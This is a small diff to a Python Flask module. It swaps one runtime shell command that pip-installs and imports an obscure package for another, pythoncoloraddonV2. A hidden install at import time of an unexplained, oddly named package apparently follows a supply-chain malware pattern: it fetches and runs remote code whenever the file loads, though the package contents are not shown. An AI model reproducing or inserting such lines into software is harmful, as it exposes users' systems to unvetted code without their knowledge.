@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pythonsqlitedbextV1")
-import pythonsqlitedbextV1
+os.system("pip install pythoncoloraddonV2")
+import pythoncoloraddonV2
 import flask
 
 from flask import g
